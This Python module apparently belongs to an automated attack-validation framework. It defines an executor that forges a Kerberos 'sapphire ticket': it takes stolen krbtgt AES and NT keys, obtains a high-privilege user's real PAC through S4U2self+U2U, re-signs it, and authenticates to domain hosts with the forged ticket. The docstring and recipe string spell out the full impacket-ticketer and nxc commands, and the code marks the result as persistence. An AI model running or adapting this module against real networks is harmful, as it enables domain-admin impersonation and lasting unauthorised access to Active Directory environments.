"""SAPPHIRE-TICKET validation executor -- T4 (Kerberos ticket forging).

The stealthiest forge: request a real ticket and, via S4U2self + U2U, obtain a
HIGH-PRIV user's genuine PAC, then re-sign it with the krbtgt key -- so the ticket
carries an authentic PAC, then authenticate through it:

    impacket-ticketer -request -impersonate <DA> -user <bare-lowpriv> -password|-hashes <...>
        -aesKey <krbtgt_aes> -nthash <krbtgt_nt> -domain-sid <SID> -domain <d> <forged>
    KRB5CCNAME=<ccache> nxc smb <fqdn> --use-kcache --kdcHost <dc>   (= the terminal)

Needs BOTH krbtgt signing keys (AES from the threaded KRBTGT cap / ``cfg.forge_key``;
NT from ``cfg.forge_key_nt``) AND a live requester credential (review H6). The
S4U/U2U flow may log a non-fatal ``KDC_ERR_TGT_REVOKED`` -- the ticket still forges
and authenticates, so the terminal is the forged-ccache login, never a tool exit
code. Non-mutating; no rollback. ``verified_recipe=True`` (lab-proven on GOAD 27NOV2026, scored *proved*, secret-clean).
"""
from __future__ import annotations

from pathlib import Path

from ..recommend import ParamSpec, values
from .. import proof, states
from .base import (ValidationExecutor, ExecutorContext, Capability,
                   CAP_PRINCIPAL, CAP_AES_KEY, CAP_NT_HASH)
from .forge_common import (signing_key, valid_key, resolve_domain_sid,
                           requester_argv, forge_and_reauth)


class SapphireTicketExecutor(ValidationExecutor):
    technique = "SAPPHIRE-TICKET"
    technique_class = "kerberos_forge"
    terminal_kind = "authn_success"
    mutating = False
    verified_recipe = True         # lab-proven on GOAD 27NOV2026 (forge+reauth, scored proved, secret-clean)
    pre = frozenset({states.S0_USER_CREDS})
    eff = frozenset({states.S_PERSISTENCE})
    recipe_ref = ("T4 SAPPHIRE = impacket-ticketer -request -impersonate <DA> -user <lowpriv> "
                  "-password/-hashes -aesKey <krbtgt_aes> -nthash <krbtgt_nt> -domain-sid <SID> "
                  "-domain <d> <user> ; nxc --use-kcache reauth (recipe pinned in-lab)")

    def param_specs(self, ctx, finding):
        e = finding.entity or {}
        return [
            ParamSpec(name="impersonate", kind="free",
                      description="High-privilege principal whose real PAC is injected (S4U2self+U2U).",
                      recommended=e.get("impersonate") or "Administrator",
                      rationale="Administrator by default."),
            ParamSpec(name="forged_user", kind="free",
                      description="Name of the forged ticket's principal.",
                      recommended=e.get("forged_user") or "sapphire_pwn",
                      rationale="A distinct name for the re-signed ticket."),
            ParamSpec(name="domain_sid", kind="free",
                      description="Domain SID (auto-resolved via lookupsid if omitted).",
                      recommended=e.get("domain_sid") or "",
                      rationale="Resolved from the configured DC when not supplied.", required=False),
            ParamSpec(name="reauth_target", kind="target_host",
                      description="FQDN of a domain host to authenticate against with the forged ticket.",
                      recommended=e.get("reauth_target") or finding.host or "",
                      rationale="Any domain-joined host accepts a valid sapphire ticket.",
                      required=True),
        ]

    def target_identity(self, ctx, finding, params):
        imp = params["impersonate"].value if "impersonate" in params else "Administrator"
        return {"domain": ctx.config.domain, "principal": imp}

    def steps_preview(self, ctx, finding, params):
        v = values(params)
        return [
            f"impacket-ticketer -request -impersonate {v['impersonate']} "
            f"-user {ctx.config.username or '<lowpriv>'} <auth> -aesKey *** -nthash *** "
            f"-domain-sid {v.get('domain_sid') or '<auto>'} -domain {ctx.config.domain} {v['forged_user']}",
            f"nxc smb {v['reauth_target']} --use-kcache --kdcHost {ctx.config.dc_ip}  (= the terminal proof)",
        ]

    def chain_pre(self, ctx, finding):
        return frozenset({states.KRBTGT})

    def chain_eff(self, ctx, finding):
        return frozenset({states.S_PERSISTENCE})

    def accepts_key(self, ctx, finding, cap):
        # Sapphire signs with the krbtgt AES key (NT supplied via cfg.forge_key_nt).
        return cap.channel in (CAP_AES_KEY, CAP_NT_HASH) and valid_key(
            cap.value, "aes" if cap.channel == CAP_AES_KEY else "nt")

    def execute(self, ctx: ExecutorContext, finding, params) -> dict:
        cfg = ctx.config
        v = values(params)
        out_dir = Path(ctx.output_dir)
        steps: list = []
        errors: list = []
        gate = {"classifier": "not_required", "op": None}

        sid = resolve_domain_sid(ctx, v.get("domain_sid") or None)
        if not sid:
            errors.append("domain_sid_unresolved")
            return self._artifact(steps, gate, None, False, errors)
        aes, kind = signing_key(ctx)
        if not (kind == "aes" and valid_key(aes, "aes")):
            errors.append("no_aes_signing_key")        # Sapphire needs the krbtgt AES key
            return self._artifact(steps, gate, None, False, errors)
        nt = getattr(cfg, "forge_key_nt", None)
        if not (nt and valid_key(nt, "nt")):
            errors.append("no_nt_signing_key")          # H6: Sapphire needs BOTH krbtgt keys
            return self._artifact(steps, gate, None, False, errors)
        req = requester_argv(cfg)
        if req is None:
            errors.append("no_requester_credential")
            return self._artifact(steps, gate, None, False, errors)

        imp = v["impersonate"]
        forged = v["forged_user"]
        forge_argv = (["impacket-ticketer", "-request", "-impersonate", imp, *req,
                       "-aesKey", aes, "-nthash", nt, "-domain-sid", sid,
                       "-domain", cfg.domain, forged])
        ok, fsteps, ferrors = forge_and_reauth(ctx, forge_argv, forged, v["reauth_target"], out_dir,
                                               expect_principal=imp)
        steps += fsteps
        errors += ferrors

        terminal_fact = proof.build_terminal_fact(
            self.terminal_kind, ok=ok, impersonated=imp,
            predicate=(f"obtained {imp}'s real PAC via S4U2self+U2U, re-signed it with the krbtgt "
                       f"key in {cfg.domain}, and authenticated through the forged ccache"),
            proof_token=proof.proof_token("SAPPHIRE-TICKET", cfg.domain, imp,
                                          "authn_success" if ok else "authn_failed"),
            extra={"impersonate": imp, "forged_user": forged},
        )
        return self._artifact(steps, gate, terminal_fact, ok, errors)

    def produced(self, ctx, finding, params, artifact):
        if not artifact.get("complete"):
            return []
        imp = params["impersonate"].value
        return [Capability(state=states.S_PERSISTENCE, channel=CAP_PRINCIPAL,
                           value=imp, principal=imp)]

    @staticmethod
    def _artifact(steps, gate, terminal_fact, complete, errors):
        return {"steps": [s.as_step() for s in steps], "gate": gate,
                "mutation": {"applied": False,
                             "rollback": {"performed": False, "verified": True, "method": None}},
                "terminal_fact": terminal_fact, "complete": complete, "errors": errors}
